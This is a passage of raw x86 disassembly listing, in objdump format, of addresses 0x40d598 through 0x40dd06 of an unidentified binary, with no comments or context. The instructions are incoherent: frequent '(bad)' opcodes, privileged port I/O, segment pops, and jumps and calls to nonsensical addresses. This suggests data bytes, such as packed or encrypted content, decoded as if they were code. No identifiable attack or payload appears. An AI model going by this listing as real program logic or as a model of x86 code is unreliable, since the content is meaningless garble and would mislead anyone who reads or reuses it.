  40d598:	jg     0x40d58d
  40d59a:	sub    DWORD PTR [edi],edi
  40d59c:	sub    DWORD PTR [ebp-0x2],ecx
  40d59f:	into   
  40d5a0:	adc    eax,0x5f9ae8ba
  40d5a5:	push   esp
  40d5a6:	out    dx,eax
  40d5a7:	inc    ebx
  40d5a8:	(bad)  
  40d5a9:	pop    ss
  40d5aa:	pop    eax
  40d5ab:	fwait
  40d5ac:	inc    ebp
  40d5ad:	pop    eax
  40d5ae:	popf   
  40d5af:	xchg   ebp,eax
  40d5b0:	pop    es
  40d5b1:	arpl   WORD PTR [ecx-0x10],cx
  40d5b4:	adc    BYTE PTR [esi],ch
  40d5b6:	cmp    BYTE PTR [edi-0x5b9be13a],dh
  40d5bc:	inc    edx
  40d5bd:	mov    WORD PTR gs:[ecx],ds
  40d5c0:	in     al,dx
  40d5c1:	sbb    bl,BYTE PTR [edi-0x4a13030d]
  40d5c7:	loopne 0x40d57b
  40d5c9:	je     0x40d5c9
  40d5cb:	mov    BYTE PTR [ebx+0x37476c54],ch
  40d5d1:	arpl   WORD PTR [edi-0x681d1752],ax
  40d5d7:	aaa    
  40d5d8:	pop    ecx
  40d5d9:	add    ebp,ecx
  40d5db:	test   eax,0x28494878
  40d5e0:	pop    edi
  40d5e1:	dec    edi
  40d5e2:	inc    edx
  40d5e3:	pushf  
  40d5e4:	cmc    
  40d5e5:	ret    0xbcf7
  40d5e8:	adc    BYTE PTR [edi-0x73],bl
  40d5eb:	pop    es
  40d5ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5ed:	fist   WORD PTR [esi]
  40d5ef:	adc    esp,edx
  40d5f1:	cdq    
  40d5f2:	les    eax,FWORD PTR [edi+0x13]
  40d5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5f6:	and    ebp,edi
  40d5f8:	or     al,0x3b
  40d5fa:	lods   al,BYTE PTR ds:[esi]
  40d5fb:	mov    bl,0x97
  40d5fd:	int3   
  40d5fe:	test   al,0xa6
  40d600:	sub    eax,0x839cf239
  40d605:	sbb    eax,0xad331c2b
  40d60a:	es das 
  40d60c:	and    BYTE PTR [edi],ah
  40d60e:	jno    0x40d644
  40d610:	xor    BYTE PTR [ebp+edi*8+0x4a5c65fc],cl
  40d617:	add    al,0x32
  40d619:	dec    ebx
  40d61a:	xchg   edi,eax
  40d61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d61c:	sub    eax,0x96aea704
  40d621:	ficom  WORD PTR [ebx-0x1e]
  40d624:	mov    cl,cl
  40d626:	test   BYTE PTR [edx+0x64e3e98],dh
  40d62c:	push   eax
  40d62d:	test   DWORD PTR [eax],esi
  40d62f:	ret    
  40d630:	sub    BYTE PTR [esi+edx*4-0x20042964],al
  40d637:	push   edi
  40d638:	aaa    
  40d639:	mov    ebp,0xcb99ae16
  40d63e:	pop    edx
  40d63f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d640:	daa    
  40d641:	xchg   ebp,eax
  40d642:	fild   QWORD PTR [edx]
  40d644:	lea    edi,[edx-0x32150cfd]
  40d64a:	lock stos DWORD PTR es:[edi],eax
  40d64c:	arpl   WORD PTR [eax-0x75],di
  40d64f:	test   DWORD PTR [eax+0x6c],ebx
  40d652:	jne    0x40d676
  40d654:	outs   dx,BYTE PTR ds:[esi]
  40d655:	ror    BYTE PTR [esp+eax*2],0x84
  40d659:	in     eax,0x88
  40d65b:	retf   0xdc05
  40d65e:	in     al,0x6a
  40d660:	adc    bh,BYTE PTR [edi-0xb2b98f2]
  40d666:	es xor eax,0xc57b7e40
  40d66c:	adc    DWORD PTR [edx],edx
  40d66e:	fcomp  DWORD PTR [edx-0x25]
  40d671:	pop    esp
  40d672:	mov    ecx,0xe747998a
  40d677:	mov    ds:0xd4612cde,eax
  40d67c:	cmc    
  40d67d:	and    eax,0xd0acf6ca
  40d682:	fisttp WORD PTR [esi-0x72d328a3]
  40d688:	ffree  st(4)
  40d68a:	(bad)  
  40d68b:	mov    edx,ebp
  40d68d:	mov    bh,0xf
  40d68f:	mov    esi,0x52bbc7a
  40d694:	stc    
  40d695:	inc    esp
  40d696:	xchg   BYTE PTR [ebx+0xbf124e8],dl
  40d69c:	dec    ebx
  40d69d:	pop    DWORD PTR [edx-0x7f00c405]
  40d6a3:	or     al,0xc8
  40d6a5:	dec    esi
  40d6a6:	in     al,0xcd
  40d6a8:	and    edx,DWORD PTR [esi+0x3d3aeafd]
  40d6ae:	jns    0x40d6fa
  40d6b0:	sub    bl,BYTE PTR ds:[edx-0x4496aa3]
  40d6b7:	js     0x40d6a8
  40d6b9:	mov    ch,0x3e
  40d6bb:	(bad)  
  40d6bc:	lods   eax,DWORD PTR ds:[esi]
  40d6bd:	cmp    ebp,ebp
  40d6bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6c0:	lods   eax,DWORD PTR ds:[esi]
  40d6c1:	push   ecx
  40d6c2:	and    BYTE PTR [edi+0x6],bh
  40d6c5:	push   es
  40d6c6:	sbb    eax,0x15ba8ac5
  40d6cb:	rcl    BYTE PTR ds:0xb8dec5b4,1
  40d6d1:	mov    WORD PTR [edx+0x5fa83af0],ss
  40d6d7:	mov    DWORD PTR [edx+0x90924af],esi
  40d6dd:	push   ebx
  40d6de:	inc    ecx
  40d6df:	data16 mov ah,0x82
  40d6e2:	jecxz  0x40d6b5
  40d6e4:	pop    eax
  40d6e5:	or     BYTE PTR [ebx],0x99
  40d6e8:	dec    ebp
  40d6e9:	stc    
  40d6ea:	aad    0x7a
  40d6ec:	clc    
  40d6ed:	cld    
  40d6ee:	mov    WORD PTR ds:0x8d9607e0,fs
  40d6f4:	inc    esp
  40d6f5:	and    eax,0x372d2310
  40d6fa:	pop    ebx
  40d6fb:	loop   0x40d772
  40d6fd:	int    0x79
  40d6ff:	adc    cl,BYTE PTR [edi]
  40d701:	fbstp  TBYTE PTR [ebx-0x5f278f9c]
  40d707:	dec    ebx
  40d708:	fsubr  QWORD PTR [ebp-0x44d96e3d]
  40d70e:	dec    esi
  40d70f:	out    0xb7,eax
  40d711:	and    ebx,DWORD PTR [esi]
  40d713:	dec    ecx
  40d714:	inc    esp
  40d715:	or     DWORD PTR [edi],0x7b155d9f
  40d71b:	aam    0x44
  40d71d:	jns    0x40d71d
  40d71f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d720:	sbb    BYTE PTR [ebp+0xee28c66],ch
  40d726:	sbb    esp,DWORD PTR [edi+0x19]
  40d729:	push   cs
  40d72a:	(bad)
  40d72d:	jno    0x40d774
  40d72f:	pop    ss
  40d730:	xchg   DWORD PTR [esi-0x2e],ebx
  40d733:	mov    dh,0x81
  40d735:	icebp  
  40d736:	inc    DWORD PTR [eiz*1-0x180accd2]
  40d73d:	retf   0x5666
  40d740:	fstp   DWORD PTR [edi-0x29]
  40d743:	aad    0x17
  40d745:	nop
  40d746:	dec    edx
  40d747:	mov    ecx,0x13b00aea
  40d74c:	jae    0x40d7a5
  40d74e:	daa    
  40d74f:	lods   eax,DWORD PTR ds:[esi]
  40d750:	cld    
  40d751:	xchg   ebp,eax
  40d752:	test   al,0xdd
  40d754:	mul    BYTE PTR [ebx+0x79170f55]
  40d75a:	mov    ah,BYTE PTR [ebp-0x6f]
  40d75d:	mov    esi,0x496d2cd4
  40d762:	jb     0x40d7e0
  40d764:	or     DWORD PTR [esp+ecx*8+0xa],edi
  40d768:	mov    ds:0xfcec550a,eax
  40d76d:	mov    dl,0xdb
  40d76f:	popf   
  40d770:	jle    0x40d6ff
  40d772:	mov    ecx,0xdbb7c00b
  40d777:	mov    bh,0xce
  40d779:	mov    edi,0x1e745474
  40d77e:	add    esi,DWORD PTR [ecx+0xe]
  40d781:	and    ebx,DWORD PTR [ebx-0x6d]
  40d784:	pop    ds
  40d785:	sbb    edx,DWORD PTR [esi]
  40d787:	ins    DWORD PTR es:[edi],dx
  40d788:	ret    0x4e77
  40d78b:	push   ecx
  40d78c:	cmp    eax,DWORD PTR [ebp-0x21]
  40d78f:	pop    eax
  40d790:	retf   0x9da3
  40d793:	mov    ebx,0xbcb67f70
  40d798:	mov    al,ds:0x40eb3b80
  40d79d:	push   cs
  40d79e:	mov    ?,esp
  40d7a0:	push   0x28
  40d7a2:	outs   dx,DWORD PTR ds:[esi]
  40d7a3:	jbe    0x40d7f2
  40d7a5:	aam    0xf5
  40d7a7:	adc    al,0x73
  40d7a9:	test   al,0x19
  40d7ab:	out    dx,al
  40d7ac:	rcr    dl,0x7b
  40d7af:	fbld   TBYTE PTR [edi+0x8d0ef91]
  40d7b5:	fnclex 
  40d7b7:	lock cmp bl,BYTE PTR [ecx+edi*1]
  40d7bb:	mov    BYTE PTR [edi-0xb49693a],al
  40d7c1:	popa   
  40d7c2:	jns    0x40d788
  40d7c4:	lds    esp,FWORD PTR [ecx-0x34]
  40d7c7:	push   ecx
  40d7c8:	sbb    eax,0x51d11081
  40d7cd:	popf   
  40d7ce:	add    bl,dl
  40d7d0:	repnz fadd QWORD PTR [esi]
  40d7d3:	call   0x7802ae9e
  40d7d8:	dec    ebx
  40d7d9:	push   cs
  40d7da:	mov    ebp,ebx
  40d7dc:	xor    al,0x58
  40d7de:	jmp    0xc0925b6a
  40d7e3:	lds    ecx,FWORD PTR [edx+0x60febd42]
  40d7e9:	loope  0x40d7b2
  40d7eb:	out    dx,al
  40d7ec:	pop    edx
  40d7ed:	repnz sahf 
  40d7ef:	loop   0x40d7f4
  40d7f1:	lods   al,BYTE PTR ds:[esi]
  40d7f2:	inc    edi
  40d7f3:	(bad)  
  40d7f5:	jno    0x40d7ee
  40d7f7:	ja     0x40d7ac
  40d7f9:	div    BYTE PTR [esp+eax*2]
  40d7fc:	rcr    ebp,1
  40d7fe:	fnstsw WORD PTR [ecx-0x76751bb8]
  40d804:	call   0xf60c1238
  40d809:	imul   esp,eax,0x8936a004
  40d80f:	push   ds
  40d810:	cmc    
  40d811:	nop
  40d812:	lods   eax,DWORD PTR ds:[esi]
  40d813:	jae    0x40d890
  40d815:	sub    cl,BYTE PTR [eax-0x1c]
  40d818:	pushf  
  40d819:	(bad)  
  40d81b:	push   0xa065fb2a
  40d820:	cs lahf 
  40d822:	mov    esi,0x87f89f3b
  40d827:	pop    ebp
  40d828:	pop    ds
  40d829:	fld    TBYTE PTR [esi]
  40d82b:	add    eax,0x4a44f1ff
  40d830:	into   
  40d831:	or     al,0xb3
  40d833:	hlt    
  40d834:	mov    dl,0x93
  40d836:	jnp    0x40d872
  40d838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d839:	icebp  
  40d83a:	jb     0x40d8a1
  40d83c:	repz ret 
  40d83e:	leave  
  40d83f:	loopne 0x40d836
  40d841:	enter  0x1491,0xfe
  40d845:	mov    dl,0x56
  40d847:	and    edx,esp
  40d849:	adc    dl,BYTE PTR [ecx-0x720602f6]
  40d84f:	adc    eax,ebx
  40d851:	sub    BYTE PTR [edx+0x3844fc13],bh
  40d857:	xor    BYTE PTR [esi-0x6],cl
  40d85a:	add    DWORD PTR [ebx],ebp
  40d85c:	sub    dl,bh
  40d85e:	test   BYTE PTR es:[edx-0x2],dl
  40d862:	and    ah,BYTE PTR [edi-0x30]
  40d865:	pop    eax
  40d866:	cmc    
  40d867:	out    0x48,eax
  40d869:	mov    bh,0x7c
  40d86b:	jmp    0x40d8bc
  40d86d:	repnz lods eax,DWORD PTR ds:[esi]
  40d86f:	pmaddwd mm0,QWORD PTR [esi+0x20]
  40d873:	push   edx
  40d874:	push   edi
  40d875:	ds icebp 
  40d877:	aad    0xa4
  40d879:	add    edi,DWORD PTR ds:[ebx-0xa8f83c0]
  40d880:	fwait
  40d881:	jb     0x40d836
  40d883:	pop    edi
  40d884:	adc    eax,DWORD PTR [edx-0x13eafa5a]
  40d88a:	fdiv   QWORD PTR [edi-0x5cd52def]
  40d890:	dec    bp
  40d892:	je     0x40d840
  40d894:	mov    ebp,0x3e1de1c2
  40d899:	icebp  
  40d89a:	and    dh,BYTE PTR [eax]
  40d89c:	mov    DWORD PTR [esi+0x1e45a379],esp
  40d8a2:	(bad)  
  40d8a3:	out    dx,eax
  40d8a4:	sbb    al,0x9d
  40d8a6:	enter  0xa08,0x2
  40d8aa:	xchg   ebx,eax
  40d8ab:	xor    al,0xcb
  40d8ad:	(bad)  
  40d8ae:	mov    eax,0x2f34ba56
  40d8b3:	sbb    BYTE PTR [esi],bl
  40d8b5:	push   ss
  40d8b6:	rol    BYTE PTR [ebp+edx*2-0x2cfb5e5b],1
  40d8bd:	js     0x40d894
  40d8bf:	dec    ebx
  40d8c0:	pop    ebx
  40d8c1:	call   0x68789a9c
  40d8c6:	mov    eax,0x704d02d8
  40d8cb:	cmp    ch,BYTE PTR [edi]
  40d8cd:	push   0xffffff82
  40d8cf:	pop    edi
  40d8d0:	leave  
  40d8d1:	(bad)  
  40d8d2:	lds    ecx,FWORD PTR [eax+0x3f41fa1d]
  40d8d8:	fcmovbe st,st(3)
  40d8da:	add    DWORD PTR [eax],esi
  40d8dc:	or     eax,0x92ca46f8
  40d8e1:	ins    BYTE PTR es:[edi],dx
  40d8e2:	imul   eax,DWORD PTR [ecx-0x80],0xdbfb404f
  40d8e9:	lock sbb bl,bh
  40d8ec:	pop    edx
  40d8ed:	jbe    0x40d889
  40d8ef:	xlat   BYTE PTR ds:[ebx]
  40d8f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8f1:	xchg   ebp,eax
  40d8f2:	retf   
  40d8f3:	inc    edx
  40d8f4:	in     al,dx
  40d8f5:	xor    eax,0xda292f65
  40d8fa:	fst    st(0)
  40d8fc:	mov    BYTE PTR [edi-0x69cf891],dh
  40d902:	rol    BYTE PTR [ebx*1+0x59e0fbb2],cl
  40d909:	outs   dx,DWORD PTR ds:[esi]
  40d90a:	sbb    al,0x97
  40d90c:	ds mov ch,0xc8
  40d90f:	in     al,0x33
  40d911:	retf   0x7525
  40d914:	(bad)  
  40d915:	lahf   
  40d916:	xor    al,0xd0
  40d918:	bound  edx,QWORD PTR [edi]
  40d91a:	adc    al,0xb3
  40d91c:	pusha  
  40d91d:	nop
  40d91e:	mov    bh,0x7e
  40d920:	mov    ecx,0x2d1ee01d
  40d925:	mov    ecx,0x171f2c9c
  40d92a:	les    eax,FWORD PTR [esi-0x755e47f2]
  40d930:	int    0xc7
  40d932:	sbb    al,0x2c
  40d934:	lock loopne 0x40d937
  40d937:	sub    al,0xbb
  40d939:	cs xchg edi,eax
  40d93b:	(bad)  
  40d93c:	mov    ch,0xca
  40d93e:	add    al,0xf1
  40d940:	jnp    0x40d941
  40d942:	mov    edi,0x9d699cc9
  40d947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d948:	pop    esp
  40d949:	nop
  40d94a:	add    BYTE PTR [ebp+0x46],ch
  40d94d:	adc    ebp,ebx
  40d94f:	and    al,0x89
  40d951:	jmp    0x40d969
  40d953:	sahf   
  40d954:	jmp    DWORD PTR [ebx-0x61]
  40d957:	aam    0xc0
  40d959:	jg     0x40d8f0
  40d95b:	(bad)  
  40d95d:	in     al,0xf2
  40d95f:	call   0x1efadf7d
  40d964:	(bad)  
  40d965:	ins    DWORD PTR es:[edi],dx
  40d966:	mov    edx,0xbcfca12b
  40d96b:	fidiv  WORD PTR [esi-0x32dc301b]
  40d971:	ffree  st(2)
  40d973:	and    eax,0x4bd756ee
  40d978:	popf   
  40d979:	adc    BYTE PTR [ebx-0x36],bh
  40d97c:	xchg   edx,eax
  40d97d:	(bad)  
  40d97e:	aam    0xac
  40d980:	lods   eax,DWORD PTR ds:[esi]
  40d981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d982:	inc    esp
  40d983:	dec    edx
  40d984:	sbb    esp,DWORD PTR [ebx]
  40d986:	inc    esp
  40d987:	outs   dx,BYTE PTR ds:[esi]
  40d988:	pushf  
  40d989:	stos   BYTE PTR es:[edi],al
  40d98a:	rcr    bh,cl
  40d98c:	mov    esp,0x3bd9a9a3
  40d991:	sbb    bl,BYTE PTR [ecx+eiz*8]
  40d994:	jb     0x40d973
  40d996:	push   ebx
  40d997:	outs   dx,BYTE PTR ds:[esi]
  40d999:	ror    BYTE PTR [ecx-0x6f3ad980],1
  40d99f:	jecxz  0x40d9df
  40d9a1:	xchg   DWORD PTR [esi+0x59925289],edi
  40d9a7:	adc    bh,BYTE PTR ds:0x7c3544ae
  40d9ad:	dec    BYTE PTR [esi]
  40d9af:	ss (bad) 
  40d9b1:	and    edi,DWORD PTR [esi+0x2576782f]
  40d9b7:	jg     0x40d9dd
  40d9b9:	lock add BYTE PTR ds:0xd78b7526,0xe
  40d9c1:	cwde   
  40d9c2:	bound  esp,QWORD PTR [bx]
  40d9c5:	lea    edi,[ebx]
  40d9c7:	mov    ch,0xb5
  40d9c9:	sub    dl,cl
  40d9cb:	or     DWORD PTR [eax],0xffffff8c
  40d9ce:	push   ecx
  40d9cf:	(bad)  [ecx-0x193d0ab8]
  40d9d5:	clc    
  40d9d6:	out    dx,al
  40d9d7:	outs   dx,DWORD PTR ds:[esi]
  40d9d8:	jo     0x40d966
  40d9da:	out    dx,eax
  40d9db:	jns    0x40d9ad
  40d9dd:	into   
  40d9de:	mov    eax,0x860f1aa8
  40d9e3:	or     eax,0x7a13fb9c
  40d9e8:	mov    ds:0x921307d6,eax
  40d9ed:	lds    eax,FWORD PTR [esi-0x49288c46]
  40d9f3:	aas    
  40d9f4:	or     eax,0xba90bc48
  40d9f9:	dec    edx
  40d9fa:	pop    ds
  40d9fb:	inc    esi
  40d9fc:	mov    ah,0xdd
  40d9fe:	add    DWORD PTR [eax],eax
  40da00:	xchg   edi,eax
  40da01:	push   edi
  40da02:	jo     0x40d9b7
  40da04:	ret    0xdf21
  40da07:	dec    edi
  40da08:	sahf   
  40da09:	sbb    ch,dh
  40da0b:	test   edx,esi
  40da0d:	fsub   DWORD PTR [edx-0x1c98b4a5]
  40da13:	adc    DWORD PTR [ebp-0x3a9faa4c],esp
  40da19:	(bad)  
  40da1a:	data16 add BYTE PTR [eax],dh
  40da1d:	xchg   ebx,eax
  40da1e:	shl    BYTE PTR [ecx+0x7c],1
  40da21:	div    DWORD PTR [eax-0x35ee3b00]
  40da27:	xchg   WORD PTR [eax+0x64d24597],sp
  40da2e:	pushf  
  40da2f:	push   ebx
  40da30:	push   ecx
  40da31:	(bad)  cs:[esi+0x6b906f9c]
  40da38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da3a:	and    DWORD PTR [edx],eax
  40da3c:	ins    BYTE PTR es:[edi],dx
  40da3d:	dec    esi
  40da3e:	cmp    BYTE PTR [ebx],cl
  40da40:	jb     0x40da1e
  40da42:	inc    esi
  40da43:	ins    BYTE PTR es:[edi],dx
  40da44:	inc    esp
  40da45:	test   DWORD PTR [eax+0x406adf4f],ebp
  40da4b:	xchg   ebp,eax
  40da4c:	push   ecx
  40da4d:	xchg   esp,eax
  40da4e:	mov    ebx,0x803c6953
  40da53:	ficom  WORD PTR [esi]
  40da55:	sti    
  40da56:	js     0x40da97
  40da58:	jb     0x40da3f
  40da5a:	add    BYTE PTR [edx+0x290034b6],0x50
  40da61:	push   cs
  40da62:	xor    edx,DWORD PTR [edi+0x7c1ccfe1]
  40da68:	int3   
  40da69:	and    DWORD PTR [eax+0x10cf9951],0x8b5878da
  40da73:	dec    ebp
  40da74:	fidivr WORD PTR [ecx]
  40da76:	jne    0x40dae0
  40da78:	repz aas 
  40da7a:	ss loopne 0x40da64
  40da7d:	dec    esp
  40da7e:	outs   dx,BYTE PTR ds:[esi]
  40da7f:	(bad)  
  40da81:	dec    edi
  40da82:	in     eax,dx
  40da83:	add    DWORD PTR [eiz*8-0x44c5a09e],esp
  40da8a:	test   al,0x56
  40da8c:	mov    dh,0xf9
  40da8e:	ins    DWORD PTR es:[edi],dx
  40da8f:	iret   
  40da90:	(bad)  
  40da91:	inc    bl
  40da93:	fst    QWORD PTR [ecx+0x406a374f]
  40da99:	add    ch,cl
  40da9b:	ds cdq 
  40da9d:	cli    
  40da9e:	jnp    0x40da73
  40daa0:	dec    eax
  40daa1:	outs   dx,BYTE PTR ds:[esi]
  40daa2:	push   0xffffffb3
  40daa4:	icebp  
  40daa5:	push   ds
  40daa6:	jecxz  0x40daf7
  40daa8:	add    BYTE PTR [esi+0x10],cl
  40daab:	ss inc eax
  40daad:	mov    bl,0xc8
  40daaf:	das    
  40dab0:	mov    ds:0x282130e1,al
  40dab5:	push   0x4fa1ec4c
  40daba:	pop    ds
  40dabb:	aam    0x5a
  40dabd:	ins    BYTE PTR es:[edi],dx
  40dabe:	rcr    DWORD PTR [ebx-0x71],cl
  40dac1:	jle    0x40da50
  40dac3:	scas   eax,DWORD PTR es:[edi]
  40dac4:	jo     0x40da7a
  40dac6:	div    BYTE PTR [edi+ebp*1]
  40dac9:	or     ebp,DWORD PTR [edi+0x2ea490eb]
  40dacf:	cmp    al,0xd8
  40dad1:	arpl   WORD PTR [esi],di
  40dad3:	ins    BYTE PTR es:[edi],dx
  40dad4:	bnd ret 
  40dad6:	jno    0x40da90
  40dad8:	pop    ss
  40dad9:	inc    edi
  40dada:	mov    dl,0x33
  40dadc:	in     al,0xe8
  40dade:	dec    ebp
  40dadf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dae0:	or     al,0x55
  40dae2:	mov    esi,0x59ec8391
  40dae7:	fisttp WORD PTR [edx+0x14]
  40daea:	pop    es
  40daeb:	call   0x753a3882
  40daf0:	stos   DWORD PTR es:[edi],eax
  40daf1:	or     DWORD PTR [ecx],0xffffffaf
  40daf4:	inc    ecx
  40daf5:	or     al,0xee
  40daf7:	cmp    dl,dl
  40daf9:	loop   0x40dacc
  40dafb:	push   edx
  40dafc:	push   0xffffffc3
  40dafe:	test   cl,cl
  40db00:	cdq    
  40db01:	out    0x45,eax
  40db03:	(bad)  
  40db04:	push   0xed158ce
  40db09:	int    0x64
  40db0b:	bound  esp,QWORD PTR [esi-0x7b]
  40db0e:	outs   dx,BYTE PTR ds:[esi]
  40db0f:	xor    eax,0xd93d6985
  40db14:	pop    es
  40db15:	int3   
  40db16:	xlat   BYTE PTR ds:[ebx]
  40db17:	sub    eax,0x434e1a35
  40db1c:	shl    DWORD PTR [eax+0x6f],cl
  40db1f:	xor    ebx,DWORD PTR [ecx-0x1]
  40db22:	mov    al,ds:0x278f3c31
  40db27:	adc    DWORD PTR es:[esp+edx*1+0x772e470a],ecx
  40db2f:	xor    al,0x2d
  40db31:	js     0x40db51
  40db33:	mov    edi,DWORD PTR [ecx-0x25]
  40db36:	pop    ecx
  40db37:	push   ebp
  40db38:	into   
  40db39:	test   DWORD PTR [ecx+0x3f],ebx
  40db3c:	push   ss
  40db3d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40db3f:	adc    al,0xab
  40db41:	pop    ss
  40db42:	sar    DWORD PTR [eax+0x3ee7d04a],0x1b
  40db49:	and    eax,0x6a712838
  40db4e:	neg    DWORD PTR [ebx-0x76c21b4c]
  40db54:	cdq    
  40db55:	test   BYTE PTR [eax+0xb3c8277],ch
  40db5b:	sub    BYTE PTR [eax+0x61],al
  40db5e:	mov    esp,DWORD PTR ds:0x6e5f0f85
  40db64:	inc    esi
  40db65:	int3   
  40db66:	aad    0xae
  40db68:	dec    ebp
  40db69:	dec    edx
  40db6a:	ds dec eax
  40db6c:	mov    dl,BYTE PTR [ebx+0x286b6ce6]
  40db72:	jge    0x40db44
  40db74:	push   ebx
  40db75:	pop    ecx
  40db76:	icebp  
  40db77:	pop    eax
  40db78:	leave  
  40db79:	add    DWORD PTR [ebx+0x24],ebx
  40db7c:	cmp    DWORD PTR [edi],0xd7b3432b
  40db82:	pop    ebp
  40db83:	scas   al,BYTE PTR es:[edi]
  40db84:	xchg   edx,eax
  40db85:	mov    eax,ds:0xd5ae0d1c
  40db8a:	xor    edx,edi
  40db8c:	(bad)  [esi]
  40db8e:	cmp    esp,DWORD PTR [esi]
  40db90:	push   0x308dda78
  40db95:	cmp    eax,0x6d08b7a0
  40db9a:	sub    ecx,DWORD PTR [edx+0x1751271d]
  40dba0:	cwde   
  40dba1:	fs cmp al,0xfe
  40dba4:	in     al,0x51
  40dba6:	mov    ax,WORD PTR [eax]
  40dba9:	rcl    BYTE PTR [ebx+0x120b5460],0x3
  40dbb0:	or     eax,0x72c08ecf
  40dbb5:	fdiv   st(7),st
  40dbb7:	ret    0x7165
  40dbba:	xchg   DWORD PTR [eax+0x313e6aa8],ecx
  40dbc0:	adc    al,0x98
  40dbc2:	test   eax,0x786ac684
  40dbc7:	sub    BYTE PTR [edi],0x37
  40dbca:	es leave 
  40dbcc:	pop    edi
  40dbcd:	dec    esi
  40dbce:	adc    eax,0xa011577c
  40dbd3:	repnz sbb edx,ecx
  40dbd6:	and    eax,0x46a1636
  40dbdb:	out    dx,al
  40dbdc:	pop    ebx
  40dbdd:	adc    eax,0xb0a44b16
  40dbe2:	or     ch,BYTE PTR [ecx-0x65]
  40dbe5:	sbb    al,0xfa
  40dbe7:	pop    ds
  40dbe8:	inc    ebx
  40dbe9:	cs stos DWORD PTR es:[edi],eax
  40dbeb:	dec    edx
  40dbec:	push   0x9c0d5341
  40dbf1:	mov    eax,0x9f37f3b7
  40dbf6:	xor    ah,BYTE PTR [ecx]
  40dbf8:	in     eax,0xcb
  40dbfa:	sub    DWORD PTR [eax-0x5a],ecx
  40dbfd:	cmp    DWORD PTR [ecx+eiz*8-0x5f0df46a],esi
  40dc04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc05:	inc    edx
  40dc06:	inc    edx
  40dc07:	jno    0x40dc70
  40dc09:	ins    DWORD PTR es:[edi],dx
  40dc0a:	mov    eax,ds:0x9ef3a817
  40dc0f:	dec    ebp
  40dc10:	(bad)  
  40dc11:	push   edi
  40dc12:	mov    edi,0x48077caf
  40dc18:	loop   0x40db9f
  40dc1a:	inc    ecx
  40dc1b:	add    esp,DWORD PTR [edi+ecx*4+0x6cb5defe]
  40dc22:	dec    ebp
  40dc23:	push   cs
  40dc24:	inc    ecx
  40dc25:	xlat   BYTE PTR ds:[ebx]
  40dc26:	stc    
  40dc27:	xor    ecx,edi
  40dc29:	xor    DWORD PTR ds:0x9a33b02b,esi
  40dc2f:	mov    bl,0xff
  40dc31:	loope  0x40dbd0
  40dc33:	ror    BYTE PTR [eax-0xb],0x3d
  40dc37:	xchg   esi,eax
  40dc38:	and    ah,BYTE PTR [ebx-0x7b3ec02a]
  40dc3e:	sbb    eax,0x97514169
  40dc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc44:	ins    BYTE PTR es:[edi],dx
  40dc45:	scas   eax,DWORD PTR es:[edi]
  40dc46:	inc    ebp
  40dc47:	data16 jae 0x40dcb3
  40dc4a:	idiv   DWORD PTR [eax+0x6c]
  40dc4d:	aam    0xb4
  40dc4f:	repz lock shl BYTE PTR [eax-0x55],1
  40dc54:	inc    eax
  40dc55:	enter  0x8461,0x45
  40dc59:	shl    BYTE PTR [ebx+0x575c99f8],1
  40dc5f:	push   ebx
  40dc60:	leave  
  40dc61:	into   
  40dc62:	fmul   DWORD PTR [edi+0x38]
  40dc65:	pop    edi
  40dc66:	dec    esi
  40dc67:	ror    BYTE PTR [ecx-0x3afa294e],0xb0
  40dc6e:	stos   BYTE PTR es:[di],al
  40dc70:	les    ebx,FWORD PTR [esi-0x4875f0db]
  40dc76:	repnz mov eax,0xd8b1506a
  40dc7c:	nop
  40dc7d:	ds mov edx,0xdded4864
  40dc83:	imul   ecx,DWORD PTR [ebx-0x1e0e38cd],0x55
  40dc8a:	enter  0x315f,0x79
  40dc8e:	mov    ds:0x41db9e62,al
  40dc93:	icebp  
  40dc94:	scas   al,BYTE PTR es:[edi]
  40dc95:	inc    edi
  40dc96:	mov    ch,0x6b
  40dc98:	cld    
  40dc99:	loope  0x40dcf0
  40dc9b:	add    esp,eax
  40dc9d:	rol    DWORD PTR [edi+0x25],1
  40dca0:	inc    ebp
  40dca1:	xor    eax,0x726d3010
  40dca6:	(bad)  
  40dca7:	fiadd  DWORD PTR [ebp-0x69bbf70a]
  40dcad:	test   eax,0xa2dae356
  40dcb2:	pop    ecx
  40dcb3:	cdq    
  40dcb4:	sbb    BYTE PTR [ecx-0x51],ch
  40dcb7:	inc    edx
  40dcb8:	(bad)  
  40dcb9:	(bad)  
  40dcba:	pop    esp
  40dcbb:	enter  0x8453,0x91
  40dcbf:	into   
  40dcc0:	jl     0x40dcc2
  40dcc2:	jbe    0x40dd2e
  40dcc4:	xor    al,bl
  40dcc6:	fcom   st(5)
  40dcc8:	je     0x40dcc1
  40dcca:	inc    edx
  40dccb:	xlat   BYTE PTR ds:[ebx]
  40dccc:	repz mov ebp,0xa9c3fe51
  40dcd2:	sbb    edx,DWORD PTR es:[edi-0x57]
  40dcd6:	ror    DWORD PTR cs:[ebx],1
  40dcd9:	or     BYTE PTR [edi+0x60],bl
  40dcdc:	xor    dh,BYTE PTR [ebx-0x20]
  40dcdf:	dec    edx
  40dce0:	mov    ecx,0xd1a43399
  40dce5:	outs   dx,BYTE PTR ds:[esi]
  40dce6:	test   al,0x2a
  40dce8:	adc    BYTE PTR ds:0x6e725e0b,ch
  40dcee:	je     0x40dcaa
  40dcf0:	imul   esi,DWORD PTR [esp+ecx*2-0x61e8fa3e],0x27c1c11
  40dcfb:	dec    esi
  40dcfc:	repz bound ebx,QWORD PTR [ecx]
  40dcff:	xor    al,0xeb
  40dd01:	dec    ebp
  40dd02:	dec    esp
  40dd03:	sbb    ebx,0x3a
  40dd06:	push   0xffffff9f
